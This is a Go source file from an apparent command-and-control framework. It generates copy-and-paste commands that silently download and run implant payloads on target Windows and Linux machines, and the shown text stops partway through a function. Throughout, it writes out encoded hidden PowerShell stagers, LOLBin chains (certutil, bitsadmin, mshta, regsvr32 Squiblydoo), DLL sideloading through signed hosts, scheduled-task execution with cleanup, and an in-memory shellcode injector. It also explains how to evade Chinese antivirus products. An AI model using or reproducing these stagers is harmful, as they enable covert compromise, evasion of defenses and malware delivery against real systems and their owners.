package api

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/database"
)

// 一键上线命令（onliner）由服务端生成，前端只负责展示与复制。
//
// 关键点：命令里的下载地址必须是「目标机能访问到的地址」，而不是控制台自身的
// 访问地址。历史上这里用 window.location.origin / req.ServerURL 拼地址，运维用
// localhost:18081 打开后台时，生成的命令就变成 localhost，目标机自然下载失败。
// 现在统一走 resolveDownloadTarget 逐级回退解析（见下方注释），并在无法确定地址
// 时回传 warning，让前端显式提示运维去配置公网地址。

// OneLiner 一个「复制到目标机执行即可静默下载并运行载荷」的命令变体。
type OneLiner struct {
	// Name 变体展示名，如 "PowerShell · Base64 编码"
	Name string `json:"name"`
	// OS windows / linux
	OS string `json:"os"`
	// Shell 命令所属解释器：PowerShell / CMD / Shell
	Shell string `json:"shell"`
	// Desc 该变体的手法与适用场景（免杀思路、依赖条件）
	Desc string `json:"desc"`
	// Command 可直接复制执行的完整命令
	Command string `json:"command"`
	// Note 加载器链变体的补充说明：前置条件、占位符含义、国产安全软件下的风险等级。
	// 普通「下载即执行」变体可以为空（omitempty，旧响应结构不变）。
	Note string `json:"note,omitempty"`
}

// OneLinerSet 一个载荷对应的全部上线命令变体，以及下载地址解析结果。
type OneLinerSet struct {
	// Host 实际解析出的下载主机（host[:port]），用于前端提示
	Host string `json:"host"`
	// BaseURL 下载端点基址，如 https://c2.example.com
	BaseURL string `json:"base_url"`
	// Warning 非空表示地址可能不可达（回环/仅内网），需要运维确认
	Warning string `json:"warning,omitempty"`
	// Variants 命令变体，第一个为主推方案
	Variants []OneLiner `json:"variants"`
}

// supportsOneLiner 判断该 OS/格式能否用「下载后直接运行」的方式上线：
// Windows 只有 exe/raw 可直接运行；Linux 额外支持 bin（so/dll 是动态库，不能直接执行）。
func supportsOneLiner(osName, format string) bool {
	switch strings.ToLower(osName) {
	case "linux":
		return format == "exe" || format == "raw" || format == "bin"
	case "windows":
		return format == "exe" || format == "raw"
	}
	return false
}

type downloadTarget struct {
	Base    string
	Host    string
	Warning string
}

// resolveDownloadTarget 解析目标机可达的载荷下载地址，优先级从高到低：
//
//  1. override：生成载荷时显式指定（download_host）
//  2. listener.public_host：监听器配置里的公网地址（CDN/反代场景由运维填写）
//  3. 控制台自身的访问地址（X-Forwarded-Host / Host）：能打开后台即说明该地址可达，
//     反代域名会被自动识别
//  4. 载荷 server_url 的主机名（内网/公网 IP 直连场景）+ API 端口
//  5. 本机内网 IP（尽力而为，附带 warning 提示）
//  6. localhost（附带 warning，明确告知目标机无法下载）
func (s *Server) resolveDownloadTarget(r *http.Request, serverURL, override string) downloadTarget {
	scheme := "http"
	if s.cfg.Server.TLSCert != "" && s.cfg.Server.TLSKey != "" {
		scheme = "https"
	}
	apiPort := int(s.cfg.Server.APIPort)
	if apiPort == 0 {
		apiPort = 8081
	}

	if base, host, ok := normalizeDownloadBase(override, scheme, apiPort); ok {
		return downloadTarget{Base: base, Host: host}
	}
	if base, host, ok := normalizeDownloadBase(s.cfg.Listener.PublicHost, scheme, apiPort); ok {
		return downloadTarget{Base: base, Host: host}
	}
	if r != nil {
		if base, host, ok := requestDownloadBase(r); ok {
			return downloadTarget{Base: base, Host: host}
		}
	}
	if u, err := url.Parse(serverURL); err == nil && u.Hostname() != "" && !isLoopbackHost(u.Hostname()) {
		host := joinHostPort(scheme, u.Hostname(), apiPort)
		return downloadTarget{Base: scheme + "://" + host, Host: host}
	}
	if ip := detectLANIP(); ip != "" {
		host := joinHostPort(scheme, ip, apiPort)
		return downloadTarget{
			Base:    scheme + "://" + host,
			Host:    host,
			Warning: fmt.Sprintf("未配置公网地址，已自动使用本机内网地址 %s。目标机不在同一内网时请在「设置 → 监听器 → 公网地址(public_host)」填写目标机可访问的地址（如 https://c2.example.com）。", host),
		}
	}
	host := "localhost"
	return downloadTarget{
		Base:    scheme + "://" + host,
		Host:    host,
		Warning: "无法确定目标机可达的下载地址，当前回环地址 " + host + " 只能在本机生效。请在「设置 → 监听器 → 公网地址(public_host)」填写公网 IP 或反代域名（如 https://c2.example.com）。",
	}
}

// oneLinerSet 组装某个载荷的全部上线命令变体；格式不支持时返回 nil。
//
// 变体分两类：
//  1. 「下载即执行」变体（oneLinerVariants）：仅当该格式本身可以执行（Windows 的
//     exe/raw，Linux 的 exe/raw/bin）时给出；
//  2. 「加载器链」变体（loaderChainVariants）：Windows 的 dll/shellcode 这类不能
//     直接执行的格式也会给出，用于规避国产安全软件对「未签名新 PE 落地执行」的拦截。
//
// 第一个变体仍是主推方案，兼容字段 OneLiner 取它，响应结构不变。
func (s *Server) oneLinerSet(r *http.Request, serverURL, osName, format, buildID, override string) *OneLinerSet {
	osName = strings.ToLower(strings.TrimSpace(osName))
	if osName == "" {
		osName = "windows"
	}
	format = strings.ToLower(strings.TrimSpace(format))

	direct := supportsOneLiner(osName, format)
	if !direct && !supportsLoaderChain(osName, format) {
		return nil
	}

	target := s.resolveDownloadTarget(r, serverURL, override)
	dlURL := fmt.Sprintf("%s/api/v1/implant/payload/%s", target.Base, url.PathEscape(buildID))

	var variants []OneLiner
	if direct {
		variants = oneLinerVariants(osName, dlURL)
	}
	variants = append(variants, loaderChainVariants(osName, format, dlURL)...)
	if len(variants) == 0 {
		return nil
	}

	return &OneLinerSet{
		Host:     target.Host,
		BaseURL:  target.Base,
		Warning:  target.Warning,
		Variants: variants,
	}
}

// oneLinerVariants 生成多套上线命令变体。
//
// 目的是不把鸡蛋放在一个篮子里：不同终端/AV/出口策略对 powershell -enc、LOLBin
// （certutil/bitsadmin）、系统自带 curl、BITS 服务、python 等的拦截情况各不相同，
// 现场可以换着试。每个变体都会随机化落地文件名，避免固定文件名被静态特征命中。
func oneLinerVariants(osName, dlURL string) []OneLiner {
	switch osName {
	case "linux":
		return linuxOneLiners(dlURL)
	default:
		return windowsOneLiners(dlURL)
	}
}

// windowsOneLiners Windows 上线命令变体（含 PowerShell 与 CMD/LOLBin 两类）。
func windowsOneLiners(dlURL string) []OneLiner {
	var out []OneLiner

	// 1. PowerShell -enc：Base64(UTF-16LE) 隐藏真实命令行，WebClient 静默下载 + 隐藏窗口启动。
	drop := randName(5) + ".exe"
	ps := fmt.Sprintf(`$p="$env:TEMP\%s";$w=New-Object Net.WebClient;$w.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · Base64 编码", OS: "windows", Shell: "PowerShell",
		Desc:    "powershell -enc 编码后命令行不出现下载地址与落地路径，WebClient 静默下载并以隐藏窗口启动。通用性最好，作为首选。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 2. BITS 传输：下载由 BITS 服务（svchost）发起，不经过命令行进程出网。
	drop = randName(5) + ".exe"
	ps = fmt.Sprintf(`$p="$env:TEMP\%s";Import-Module BitsTransfer;$j=Start-BitsTransfer -Source '%s' -Destination $p -Asynchronous;while($j.JobState -eq 'Transferring'){Start-Sleep -Milliseconds 300};Complete-BitsTransfer $j;Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · BITS 传输", OS: "windows", Shell: "PowerShell",
		Desc:    "经 BITS 服务下载，出网进程是 svchost 而非脚本宿主；可绕过只放行浏览器/系统更新出网的主机策略。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 3. HttpClient：去掉 Net.WebClient / DownloadFile 明文特征。
	drop = randName(5) + ".exe"
	ps = fmt.Sprintf(`$p="$env:TEMP\%s";$h=New-Object Net.Http.HttpClient;$h.Timeout=[TimeSpan]::FromSeconds(30);$b=$h.GetByteArrayAsync('%s').Result;[IO.File]::WriteAllBytes($p,$b);Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · HttpClient 无 WebClient 特征", OS: "windows", Shell: "PowerShell",
		Desc:    "使用 .NET HttpClient 字节流写盘，替换常见规则里 WebClient+DownloadFile 的组合特征；行为与首选方案一致。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 4. certutil：Windows 自带签名工具，常被白名单放过。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · certutil (LOLBin)", OS: "windows", Shell: "CMD",
		Desc:    "系统自带签名工具下载，白名单/应用控制策略常放过；会在 Crypto 缓存留下记录，适合短平快场景。",
		Command: fmt.Sprintf(`certutil -urlcache -split -f "%s" "%%TEMP%%\%s" && start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	// 5. bitsadmin：老牌 BITS 命令行工具，同样借助系统服务出网（Win7 起全版本可用）。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · bitsadmin (LOLBin)", OS: "windows", Shell: "CMD",
		Desc:    "借助 BITS 服务的命令行下载，兼容性覆盖老系统；部分环境已弃用该工具，失败时换 BITS 的 PowerShell 变体。",
		Command: fmt.Sprintf(`bitsadmin /transfer toshell /download /priority normal "%s" "%%TEMP%%\%s" >nul & start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	// 6. curl.exe：Win10 1803+ 自带，命令行短、不依赖 PowerShell 执行策略。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · curl.exe", OS: "windows", Shell: "CMD",
		Desc:    "系统自带 curl（Win10 1803+/Server 2019+），不触发 PowerShell 执行策略与脚本日志；老系统无 curl.exe 时改用 certutil 变体。",
		Command: fmt.Sprintf(`curl.exe -fsSL "%s" -o "%%TEMP%%\%s" && start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	return out
}

// linuxOneLiners Linux 上线命令变体：覆盖有无 curl/wget、精简系统（busybox）、
// 以及 /tmp 被挂载为 noexec 的加固主机。
func linuxOneLiners(dlURL string) []OneLiner {
	var out []OneLiner

	// 1. curl 优先、wget 兜底：一条命令覆盖绝大多数发行版。
	drop := fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · curl / wget 兜底", OS: "linux", Shell: "Shell",
		Desc:    "curl 失败自动回退 wget，落地到 /tmp 隐藏文件名后放行并脱离终端运行；通用性最好，作为首选。",
		Command: fmt.Sprintf(`curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; nohup %s >/dev/null 2>&1 &`, dlURL, drop, drop, dlURL, drop, drop),
	})

	// 2. wget 单工具版：部分加固主机卸载了 curl。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · wget", OS: "linux", Shell: "Shell",
		Desc:    "仅依赖 wget（部分加固镜像会卸载 curl），下载成功后后台运行。",
		Command: fmt.Sprintf(`wget -qO %s '%s' && chmod +x %s && nohup %s >/dev/null 2>&1 &`, drop, dlURL, drop, drop),
	})

	// 3. busybox wget：路由器/OpenWrt/容器精简镜像常见。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · busybox wget", OS: "linux", Shell: "Shell",
		Desc:    "路由、IoT、精简容器镜像里常见的 busybox 环境；setsid 让进程脱离当前会话，避免退出终端被回收。",
		Command: fmt.Sprintf(`busybox wget -q -O %s '%s' 2>/dev/null; chmod +x %s; setsid %s >/dev/null 2>&1 &`, drop, dlURL, drop, drop),
	})

	// 4. python3：无 curl/wget 但有 python 的镜像。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · python3", OS: "linux", Shell: "Shell",
		Desc:    "纯 Python 标准库下载（urllib），不依赖任何外部下载工具；常用于只装了 python3 的容器与跳板机。",
		Command: fmt.Sprintf(`python3 -c "import urllib.request as u,os;p='%s';u.urlretrieve('%s',p);os.chmod(p,0o755);os.system('setsid '+p+' >/dev/null 2>&1 &')"`, drop, dlURL),
	})

	// 5. 落地到用户缓存目录：绕过 /tmp 被挂载为 noexec 的加固策略。
	drop = fmt.Sprintf("$HOME/.cache/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · 落地用户目录（规避 /tmp noexec）", OS: "linux", Shell: "Shell",
		Desc:    "很多加固基线把 /tmp 挂载为 noexec，导致下载成功却无法执行；此变体改落地到家目录缓存目录。",
		Command: fmt.Sprintf(`d="${HOME:-/tmp}/.cache";mkdir -p "$d";p="%s";curl -fsSL '%s' -o "$p" 2>/dev/null || wget -qO "$p" '%s';chmod +x "$p";setsid "$p" >/dev/null 2>&1 &`, drop, dlURL, dlURL),
	})

	// 6. setsid + 重定向到 /dev/null：完全脱离终端与会话，适合 ssh 一次性执行。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · setsid 完全脱离终端", OS: "linux", Shell: "Shell",
		Desc:    "setsid 建立独立会话，父进程退出后植入体不会被 SIGHUP 回收，适合 ssh 执行完立即断开。",
		Command: fmt.Sprintf(`setsid sh -c "curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; exec %s" >/dev/null 2>&1 &`, dlURL, drop, drop, dlURL, drop, drop),
	})

	return out
}

// ---- 加载器链（loader chain）----
//
// 现场实测：在装有 360 安全卫士/腾讯电脑管家等国产安全软件的主机上，任何新生成的、
// 未签名的 PE 一执行就被拒绝并删除文件（连 Hello World 的 Go 程序也一样），而微软
// 签名的系统程序副本可以正常运行。也就是说「下载一个未签名 exe 再执行」这条链路在
// 加固主机上基本无效，必须换成「不落地未签名 PE」或「由已签名宿主加载」的链路。
//
// 这里只生成**纯文本命令/步骤**：不内置、不下载、不打包任何第三方宿主程序或加载器，
// 宿主 exe 及其 DLL 名由操作员自备并自负合规责任。所有链路都复用 oneLinerSet 已解析
// 出的下载基址，不新增任何下载接口。

const (
	// payloadDownloadPath 载荷下载端点路径，与路由 /implant/payload/{id} 保持一致。
	payloadDownloadPath = "/api/v1/implant/payload/"

	// 加载器链常常需要「另一种格式」的载荷（dll / shellcode）。下面两个占位 build id
	// 复用同一个下载接口，不新增接口：操作员按提示另建一份对应格式的载荷，再把占位符
	// 换成真实 ID 即可。
	loaderDLLIDPlaceholder       = "<DLL载荷ID>"
	loaderShellcodeIDPlaceholder = "<shellcode载荷ID>"
	loaderC2Placeholder          = "<你的C2地址>"
)

// supportsLoaderChain 判断该 OS/格式是否需要（且能给出）加载器链。
//
// 只有 Windows 需要：国产安全软件拦截的核心是「未签名新 PE 落地执行」。Linux/macOS 的
// 落地建议由 LoaderAdvice 以纯文本给出，不塞进命令变体里。
func supportsLoaderChain(osName, format string) bool {
	if strings.ToLower(strings.TrimSpace(osName)) != "windows" {
		return false
	}
	switch strings.ToLower(strings.TrimSpace(format)) {
	case "exe", "raw", "dll", "shellcode", "shellcode_bin":
		return true
	}
	return false
}

// downloadBase 从载荷下载地址里截出基址（去掉端点路径与 build id）。
// 解析失败返回空串，调用方自行回退到 loaderC2Placeholder。
func downloadBase(dlURL string) string {
	if i := strings.Index(dlURL, payloadDownloadPath); i > 0 {
		return dlURL[:i]
	}
	return ""
}

// payloadURLWithID 基于现有下载地址生成同一接口下另一个载荷（dll/shellcode）的地址。
func payloadURLWithID(dlURL, id string) string {
	if i := strings.Index(dlURL, payloadDownloadPath); i >= 0 {
		return dlURL[:i+len(payloadDownloadPath)] + id
	}
	return dlURL
}

// loaderDLLURL 加载器链里 DLL 的下载地址：当前载荷本身就是 dll 时直接用它，
// 否则给出同一接口下的占位 ID（操作员需另按 dll 格式生成载荷）。
func loaderDLLURL(dlURL, format string) string {
	if strings.EqualFold(strings.TrimSpace(format), "dll") {
		return dlURL
	}
	return payloadURLWithID(dlURL, loaderDLLIDPlaceholder)
}

// loaderShellcodeURL 同上，用于 shellcode：shellcode 格式的下载物是 hex 文本，
// shellcode_bin 才是原始字节。
func loaderShellcodeURL(dlURL, format string) string {
	switch strings.ToLower(strings.TrimSpace(format)) {
	case "shellcode", "shellcode_bin":
		return dlURL
	}
	return payloadURLWithID(dlURL, loaderShellcodeIDPlaceholder)
}

// loaderInjectScript 生成「拉取 shellcode 并在当前进程内执行」的 PowerShell 脚本：
// hexShellcode 为真时按 hex 文本解码（服务端 shellcode 格式的下载物就是 hex 文本），
// 为假时按 shellcode_bin 的原始字节处理。
func loaderInjectScript(url string, hexShellcode bool) string {
	const addType = `$m=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name K -PassThru;`
	const run = `$p=$m::VirtualAlloc([IntPtr]::Zero,[UIntPtr]$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);$m::WaitForSingleObject($m::CreateThread([IntPtr]::Zero,0,$p,[IntPtr]::Zero,0,[IntPtr]::Zero),0xFFFFFFFF)`

	var fetch string
	if hexShellcode {
		fetch = fmt.Sprintf(`$h=(New-Object Net.WebClient).DownloadString('%s').Trim();$n=[int]($h.Length/2);$b=New-Object byte[] $n;for($i=0;$i -lt $n;$i++){$b[$i]=[Convert]::ToByte($h.Substring($i*2,2),16)};`, url)
	} else {
		fetch = fmt.Sprintf(`$b=(New-Object Net.WebClient).DownloadData('%s');`, url)
	}
	return fetch + addType + run
}

// loaderChainVariants 生成 Windows「加载器链」变体：执行体是已签名的系统/宿主程序，
// 或者干脆不落地 PE。每条都带 Note 说明前置条件、占位符含义与国产杀软下的风险等级。
func loaderChainVariants(osName, format, dlURL string) []OneLiner {
	if !supportsLoaderChain(osName, format) {
		return nil
	}
	dllURL := loaderDLLURL(dlURL, format)
	scURL := loaderShellcodeURL(dlURL, format)
	// shellcode 格式（默认）下载物是 hex 文本；shellcode_bin 是原始字节。
	hexShellcode := !strings.EqualFold(strings.TrimSpace(format), "shellcode_bin")

	var out []OneLiner

	// 1. 白加黑：植入端做成 dll，改名为已签名宿主会加载的 DLL，由签名宿主侧加载。
	out = append(out, OneLiner{
		Name: "白加黑 · 签名宿主 DLL 侧加载", OS: "windows", Shell: "CMD",
		Desc: "把植入端按 dll 格式构建并改名为「已签名宿主 exe 启动时会加载的那个 DLL」，放到宿主同目录后运行签名宿主：磁盘上不出现未签名的 PE，发起执行的进程是已签名程序。",
		Command: fmt.Sprintf(`set "D=<已签名宿主exe所在目录，如 C:\Path>"
set "N=<该宿主启动时加载的DLL文件名，如 version.dll>"
set "H=<已签名宿主exe完整路径，如 C:\Path\SignedHost.exe>"
certutil -urlcache -split -f "%s" "%%D%%\%%N%%"
start "" "%%H%%"`, dllURL),
		Note: "前置条件：① 先在生成载荷页按 dll 格式构建植入端，并把命令里的 " + loaderDLLIDPlaceholder +
			" 换成实际 build id；② 操作员自备一个已签名宿主 exe 以及它启动时会加载的 DLL 文件名 —— 找法：用 Procmon 过滤 Process Name 为该宿主、Path ends with .dll、Result 为 NAME NOT FOUND，缺哪个同目录 DLL 时宿主仍能继续启动，那个 DLL 名就是可劫持点（本项目不内置、也不推荐任何具体宿主软件，宿主由操作员自备）；③ DLL 导出函数名以构建配置为准，侧加载一般不需要显式调用导出。风险等级：中 —— 加载器是签名程序，但 360/电脑管家会校验「已签名进程加载无签名 DLL」，成功率取决于宿主与 DLL 名的白名单信誉；certutil 下载会在 Crypto 缓存留记录（可用 certutil -urlcache * delete 清理）。不要使用系统关键 DLL 名，可能破坏系统或被自保护机制拦截。",
	})

	// 2. 计划任务 + 已签名宿主：创建、运行、删除三条 schtasks 命令。
	out = append(out, OneLiner{
		Name: "计划任务 · 已签名宿主加载", OS: "windows", Shell: "CMD",
		Desc: "用 schtasks 建一个一次性任务，任务动作是已签名的 rundll32.exe 加载我们的 DLL，立即 /run 触发、随后 /delete 删除：执行体与父进程都不落在未签名 PE 上。",
		Command: fmt.Sprintf(`set "P=<DLL落地完整路径，如 C:\Users\Public\<8位随机名>.dll>"
certutil -urlcache -split -f "%s" "%%P%%"
schtasks /create /tn "<任务名，如 SystemHealthCheck>" /tr "rundll32.exe \"%%P%%\",<DLL导出函数名>" /sc once /st 00:00 /f
schtasks /run /tn "<任务名，如 SystemHealthCheck>"
schtasks /delete /tn "<任务名，如 SystemHealthCheck>" /f`, dllURL),
		Note: "前置条件：需要 dll 格式载荷，且知道 DLL 的导出函数名；" + loaderDLLIDPlaceholder +
			" 要换成真实 build id。/sc once /st 00:00 只是任务的计划时间，实际靠 /run 立即触发；执行完立刻 /delete 减少留痕。风险等级：高 —— 「schtasks 创建指向 rundll32 + 用户可写目录 DLL 的任务」是 360/电脑管家的重点行为规则，经常在建任务阶段就被拦截并回滚；把宿主动作换成 mshta/regsvr32 同样适用且同样敏感。任务名可以伪装成系统维护类名称，但不要指望它绕过行为拦截。",
	})

	// 3. LOLBin 侧加载：rundll32 直接加载落地的 DLL。
	out = append(out, OneLiner{
		Name: "LOLBin · rundll32 侧加载", OS: "windows", Shell: "CMD",
		Desc:    "落地 DLL 后用微软签名的 rundll32.exe 加载指定导出函数，命令行短、不依赖 PowerShell 执行策略。",
		Command: fmt.Sprintf(`certutil -urlcache -split -f "%s" "%%TEMP%%\<DLL文件名>.dll" && rundll32.exe "%%TEMP%%\<DLL文件名>.dll",<DLL导出函数名>`, dllURL),
		Note:    "前置条件：dll 格式载荷 + 导出函数名；请把 <DLL文件名> 换成实际 DLL 名（保留 .dll 后缀）。风险等级：高 —— 「rundll32 加载 %TEMP% 下的 DLL」是国产杀软最典型的高危组合，多数环境直接拦截或事后清理；只有基础防护的主机上成功率较高。相比白加黑，本链路没有签名宿主做掩护，优先级更低。",
	})

	// 4. LOLBin 侧加载：mshta 内联 JScript 下载 DLL 后交给 rundll32。
	out = append(out, OneLiner{
		Name: "LOLBin · mshta 脚本下载并加载", OS: "windows", Shell: "CMD",
		Desc:    "mshta.exe（微软签名宿主）执行内联 JScript，用 WinHttp + ADODB.Stream 把 DLL 写到 %TEMP%，再调 rundll32 加载；出网进程是脚本宿主而不是我们的载荷。",
		Command: fmt.Sprintf(`mshta.exe "javascript:var x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','%s',false);x.send();var d=new ActiveXObject('WScript.Shell').ExpandEnvironmentStrings('%%TEMP%%')+'\\<DLL文件名>.dll';var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(x.ResponseBody);s.SaveToFile(d,2);s.Close();new ActiveXObject('WScript.Shell').Run('rundll32.exe "'+d+'",<DLL导出函数名>',0);close()"`, dllURL),
		Note:    "前置条件：dll 格式载荷 + 导出函数名，替换 <DLL文件名>；整条命令要连引号一起复制（mshta 的 javascript: 参数含空格）。需要读取命令输出时，把 WScript.Shell.Run 换成 WScript.Shell.Exec。风险等级：高 —— mshta + WinHttp + ADODB.Stream 是国产杀软的高危行为链，很多加固基线用 AppLocker/WDAC 直接禁用 mshta；能否使用取决于目标机是否仍允许 mshta 出网。",
	})

	// 5. Squiblydoo：regsvr32 通过系统自带 scrobj.dll 远程加载 scriptlet。
	sctBase := downloadBase(dlURL)
	if sctBase == "" {
		sctBase = loaderC2Placeholder
	}
	out = append(out, OneLiner{
		Name: "LOLBin · regsvr32 Squiblydoo", OS: "windows", Shell: "CMD",
		Desc:    "regsvr32.exe 通过系统自带的 scrobj.dll 把远程 scriptlet(.sct) 当 COM 脚本执行，绕过「下载可执行文件」的特征；SCT 内部再下载或加载我们的载荷。",
		Command: fmt.Sprintf(`regsvr32.exe /s /n /u /i:"%s/<脚本名>.sct" scrobj.dll`, sctBase),
		Note: "前置条件：需要一个经 HTTP 提供的 scriptlet 脚本 —— 当前下载接口返回的是 PE/hex 载荷，不是 SCT，本项目不内置也不托管 SCT 文件；请把自备的 SCT 放到下载基址 " + sctBase +
			" 下的静态路径，并把 <脚本名> 换成实际文件名（复用既有基址，不新增任何下载接口）。SCT 通常是「下载并执行 / 调 rundll32 加载 DLL」的 JScript。风险等级：高 —— Squiblydoo 在国内杀软下普遍被拦，regsvr32 出网拉脚本经常被直接结束进程；只在允许 regsvr32 出网的老环境里值得一试。",
	})

	// 6. certutil 下载 + 签名宿主加载：与既有「certutil 下载 exe 直接 start」变体不同，
	// 落地物是 DLL，由签名宿主加载，避免未签名 exe 一落地就被删。
	out = append(out, OneLiner{
		Name: "LOLBin · certutil 下载 + 宿主加载", OS: "windows", Shell: "CMD",
		Desc:    "系统自带的签名工具 certutil 下载 DLL，再用 start 拉起 rundll32 加载：没有未签名 exe 落地，命令行里也不出现 PowerShell。",
		Command: fmt.Sprintf(`certutil -urlcache -split -f "%s" "%%TEMP%%\<DLL文件名>.dll" && start "" /b rundll32.exe "%%TEMP%%\<DLL文件名>.dll",<DLL导出函数名>`, dllURL),
		Note:    "前置条件：dll 格式载荷 + 导出函数名，替换 <DLL文件名>。风险等级：高 —— certutil 下载 + rundll32 加载用户目录 DLL 同样是重点规则（比单独 certutil 下载 exe 更敏感），certutil 还会在 Crypto 缓存留记录。若目标机防护较松、只需要落一份 exe，用上面的 certutil/bitsadmin/curl「下载即执行」变体更简单。",
	})

	// 7. 内存加载：拉 shellcode 直接注入 powershell 自身（不落地 PE）。
	inject := loaderInjectScript(scURL, hexShellcode)
	out = append(out, OneLiner{
		Name: "内存加载 · PowerShell 注入 shellcode", OS: "windows", Shell: "PowerShell",
		Desc:    "从 C2 拉取 shellcode（不是 exe），用 VirtualAlloc + CreateThread 在当前 powershell.exe（微软签名进程）内执行：磁盘上不落地任何 PE，绕开「新 PE 落地即被删」。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(inject),
		Note: "前置条件：需要 shellcode 格式载荷（下载物是 hex 文本，脚本按 hex 解码；" + loaderShellcodeIDPlaceholder +
			" 换成实际 build id）或 shellcode_bin 格式（原始字节）。本变体不落地 PE，shellcode 注入的是 powershell.exe 自己。风险等级：高 —— ① Add-Type 会调用 .NET 编译器 csc.exe 并在 %TEMP% 生成编译中间文件，ConstrainedLanguage / AppLocker / WDAC 环境下会直接失败；② 「脚本宿主 + RWX 内存 + 远程线程」是 360/电脑管家的重点行为；③ 但相比下发未签名 exe，本链路不会被「一落地就删文件」。目标机禁用 PowerShell 时退回白加黑或计划任务链。",
	})

	// 8. 内存加载（分离出网进程）：mshta 出网拉 hex shellcode，交给签名的 powershell 注入。
	out = append(out, OneLiner{
		Name: "内存加载 · mshta 拉取 + 签名宿主注入（骨架）", OS: "windows", Shell: "CMD",
		Desc:    "mshta.exe 自己出网把 shellcode 的 hex 文本写到本地，再拉起已签名的 powershell 执行注入：让「从 C2 取数据」的进程是签名脚本宿主，powershell 只负责注入。",
		Command: fmt.Sprintf(`mshta.exe "javascript:var x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','%s',false);x.send();var p=new ActiveXObject('WScript.Shell').ExpandEnvironmentStrings('%%TEMP%%')+'\\<shellcode hex文件名>.txt';var s=new ActiveXObject('ADODB.Stream');s.Type=2;s.Charset='utf-8';s.Open();s.WriteText(x.responseText);s.SaveToFile(p,2);s.Close();new ActiveXObject('WScript.Shell').Run('powershell -w hidden -nop -enc <注入器Base64>',0);close()"`, scURL),
		Note: "前置条件：① 需要 shellcode 格式载荷（hex 文本），替换 <shellcode hex文件名>，" + loaderShellcodeIDPlaceholder +
			" 换成实际 build id；② <注入器Base64> 用上面「内存加载 · PowerShell 注入 shellcode」变体里的 -enc 串填入（该脚本会自行下载并注入，本变体只是把出网动作交给 mshta；也可以改成读取本地 hex 文件的脚本）。骨架里落地的只有 hex 文本，不是 PE，符合「不落地未签名 PE」。风险等级：高 —— mshta + ADODB.Stream + powershell -enc 三段组合是高危行为链，国产杀软基本都拦；本链路的唯一价值是拆分「出网进程」与「注入进程」，目标机不认这套时直接用上面的 PowerShell 变体。",
	})

	return out
}

// LoaderAdvice 按目标平台与载荷格式给出「该走哪条落地链」的建议（纯函数，便于单测）。
//
// signed 表示「植入端载荷自身是否已用受信任证书签名」。服务端目前拿不到该状态
// （builder 不做签名），先作为参数预留，调用方接线后传入真实值即可。
//
// 返回的 title 是一句话结论，tips 是可直接展示给操作员的要点，顺序即建议优先级。
func LoaderAdvice(targetOS, format string, signed bool) (title string, tips []string) {
	osName := strings.ToLower(strings.TrimSpace(targetOS))
	if osName == "" {
		osName = "windows"
	}
	format = strings.ToLower(strings.TrimSpace(format))
	if format == "" {
		format = "exe"
	}

	switch osName {
	case "linux":
		return "Linux：优先直接下载执行，注意 /tmp 是否 noexec", []string{
			"Linux 上不存在「国产杀软拦未签名 PE」这个问题，主要看目标机是否有 EDR/HIDS 与加固基线；优先用 curl/wget 直接下载执行。",
			"/tmp 被挂载为 noexec 时下载成功也执行不了，改落地到 $HOME/.cache 并 chmod +x（内置变体里已有这条）。",
			"没有 curl/wget 的精简镜像（路由/IoT/容器）用 busybox wget 或 python3 -c urllib 下载。",
			"用 setsid/nohup 脱离终端，避免 ssh 断开后被 SIGHUP 回收；需要长期驻留再考虑 systemd 用户服务（会留痕）。",
			"自查：uname -m 与载荷架构（amd64/386/arm64）要匹配，静态编译的 Go 载荷一般无 libc 依赖问题。",
		}
	case "darwin":
		return "macOS：Gatekeeper 会拦截未签名/未公证的二进制", []string{
			"macOS 没有国产杀软的 PE 拦截，但 Gatekeeper/quarantine 会挡住未签名、未公证的可执行文件；下载落地的文件通常带 com.apple.quarantine 属性。",
			"需要 xattr -d com.apple.quarantine <文件> 清属性并 chmod +x，或对二进制做 ad-hoc 签名（codesign -s - <文件>）后再运行。",
			"用户交互场景（右键打开 / 系统设置里放行）比自动化更难，优先考虑脚本类落地方式。",
